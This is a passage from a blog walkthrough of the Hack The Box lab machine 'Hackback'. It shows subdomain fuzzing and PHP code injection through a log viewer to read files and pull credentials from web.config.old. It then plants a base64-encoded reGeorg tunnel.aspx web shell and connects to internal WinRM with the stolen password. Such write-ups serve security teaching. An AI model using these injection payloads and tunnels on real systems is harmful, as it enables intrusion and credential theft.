000001:  C=200     33 L       54 W          614 Ch        &quot;hackthebox&quot;
000005:  C=200    102 L      345 W         4110 Ch        &quot;www.hackthebox&quot;
000008:  C=200     33 L       54 W          614 Ch        &quot;www.htb&quot;
000009:  C=400      6 L       26 W          334 Ch        &quot;&quot;
000006:  C=200     33 L       54 W          614 Ch        &quot;www.hacktheboxeu&quot;
000007:  C=200     33 L       54 W          614 Ch        &quot;www.hackthebox.eu&quot;
000002:  C=200     33 L       54 W          614 Ch        &quot;hacktheboxeu&quot;
000003:  C=200     33 L       54 W          614 Ch        &quot;hackthebox.eu&quot;
000004:  C=200     33 L       54 W          614 Ch        &quot;htb&quot;

Total time: 0.492524
Processed Requests: 9
Filtered Requests: 0
Requests/sec.: 18.27319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;wwwhackthebox-gave-a-different-response-length-so-its-the-right-one-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;www.hackthebox&lt;/code&gt; gave a different response length so it’s the right one. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/15.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.hackthebox.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/hackback/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;just-a-fake-hack-the-box-login-page-i-entered-test-credentials-&quot;&gt;Just a fake Hack The Box login page. I entered test credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-checked-the-secret-path-again-and-did-list-&quot;&gt;Then I checked the secret path again and did &lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-logs-increased-by-one-i-did-show-and-found-the-credentials-i-just-sent-&quot;&gt;The logs increased by one. I did &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; and found the credentials I just sent :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'                                                                                                        
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;php-code-injection-uploading-tunnel&quot;&gt;PHP Code Injection, Uploading Tunnel&lt;/h3&gt;
&lt;h4 id=&quot;with-a-functionality-like-this-there-might-be-some-injection-somewhere-after-some-attempts-i-tried-php-code-and-it-was-executed-&quot;&gt;With a functionality like this, there might be some injection somewhere. After some attempts I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code and it was executed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-username-is-empty-instead-of-printing-the-text-i-have-sent-which-means-that-it-got-executed-as-php-however-all-the-functions-we-would-use-to-get-rce-like-exec-and-system-are-disabled-so--no-we-wont-have-a-shell-now&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; is empty instead of printing the text I have sent, which means that it got executed as &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt;. However all the functions we would use to get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; like &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; are disabled so … no we won’t have a shell now.&lt;/h4&gt;
&lt;h4 id=&quot;i-wanted-to-list-the-files-in-the-current-directory-so-i-used-the-scandir-function-&quot;&gt;I wanted to list the files in the current directory so I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;scandir()&lt;/code&gt; function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('.')); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 05:06:37 PM] 10.10.xx.xx - Username: Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; index.html
    [3] =&amp;gt; webadmin.php
)
, Password: whatever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-up-one-directory-&quot;&gt;I went up one directory :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('..')); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; 2bb6916122f1da34dcd916421e531578
    [3] =&amp;gt; App_Data
    [4] =&amp;gt; aspnet_client
    [5] =&amp;gt; css
    [6] =&amp;gt; img
    [7] =&amp;gt; index.php
    [8] =&amp;gt; js
    [9] =&amp;gt; logs
    [10] =&amp;gt; web.config
    [11] =&amp;gt; web.config.old
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;webconfig-and-webconfigold-look-interesting-i-checked-them-and-in-webconfigold-i-found-some-credentials-i-used-the-file_get_contents-function-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; look interesting. I checked them and in &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; I found some credentials. I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_get_contents()&lt;/code&gt; function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php echo file_get_contents('../web.config.old'); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;webconfigold-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;system.webServer&amp;gt;
        &amp;lt;authentication mode=&quot;Windows&quot;&amp;gt;
        &amp;lt;identity impersonate=&quot;true&quot;                 
            userName=&quot;simple&quot; 
            password=&quot;ZonoProprioZomaro:-(&quot;/&amp;gt;
     &amp;lt;/authentication&amp;gt;
        &amp;lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&amp;gt;
    &amp;lt;/system.webServer&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;credentials--simple--zonopropriozomaro--however-theres-no-place-to-use-these-credentials-i-went-back-to-the-http-port-6666-and-i-executed-netstat-i-found-that-winrm-was-running-internally-&quot;&gt;Credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;simple : ZonoProprioZomaro:-(&lt;/code&gt;. However there’s no place to use these credentials. I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port 6666 and I executed &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat&lt;/code&gt;. I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; was running internally :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;CimInstanceProperties&quot;:  [
                                      &quot;Caption&quot;,
                                      &quot;Description&quot;,
                                      &quot;ElementName&quot;,
                                      &quot;InstanceID = \&quot;::1??49852??::1??5985\&quot;&quot;,
                                      &quot;CommunicationStatus&quot;,
                                      &quot;DetailedStatus&quot;,
                                      &quot;HealthState&quot;,
                                      &quot;InstallDate&quot;,
                                      &quot;Name&quot;,
                                      &quot;OperatingStatus&quot;,
                                      &quot;OperationalStatus&quot;,
                                      &quot;PrimaryStatus&quot;,
                                      &quot;Status&quot;,
                                      &quot;StatusDescriptions&quot;,
                                      &quot;AvailableRequestedStates&quot;,
                                      &quot;EnabledDefault = 2&quot;,
                                      &quot;EnabledState&quot;,
                                      &quot;OtherEnabledState&quot;,
                                      &quot;RequestedState = 5&quot;,
                                      &quot;TimeOfLastStateChange&quot;,
                                      &quot;TransitioningToState = 12&quot;,
                                      &quot;AggregationBehavior&quot;,
                                      &quot;Directionality&quot;,
                                      &quot;CreationTime = 12/31/1600 4:00:00 PM&quot;,
                                      &quot;LocalAddress = \&quot;::1\&quot;&quot;,
                                      &quot;LocalPort = 49852&quot;,
                                      &quot;OwningProcess = 0&quot;,
                                      &quot;AppliedSetting = 6&quot;,
                                      &quot;OffloadState = 0&quot;,
                                      &quot;RemoteAddress = \&quot;::1\&quot;&quot;,
                                      &quot;RemotePort = 5985&quot;,
                                      &quot;State = 11&quot;
                                  ],	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-somehow-we-need-a-proxy-to-run-internally-and-make-us-able-to-connect-to-winrm-luckily-theres-regeorgsocksproxy&quot;&gt;So somehow we need a proxy to run internally and make us able to connect to &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt;. Luckily there’s &lt;a href=&quot;https://github.com/sensepost/reGeorg&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-downloaded-tunnelaspx-converted-it-to-base-64-then-i-uploaded-it-using-file_put_contents-and-base64_decode-&quot;&gt;I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;tunnel.aspx&lt;/code&gt;, converted it to &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; then I uploaded it using &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;base64_decode()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php file_put_contents(&quot;tunnel.aspx&quot;,base64_decode(&quot;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK&quot;)); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-checked-the-tunnel-&quot;&gt;Then I checked the tunnel :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-&quot;&gt;Great !&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;running-the-proxy-server-shell-as-simple&quot;&gt;Running the Proxy Server, Shell as simple&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-to-do-is-to-configure-proxychains-to-use-whatever-port-we-like-i-used-8888-&quot;&gt;First thing to do is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use whatever port we like, I used 8888 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/hackback/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-regeorgsocksproxypy-and-gave-it-the-port-and-the-path-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy.py&lt;/code&gt; and gave it the port and the path :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-connect-as-simple-i-used-alamots-winrm-ruby-shell-&quot;&gt;Now we can connect as &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt;. I used Alamot’s winrm ruby shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
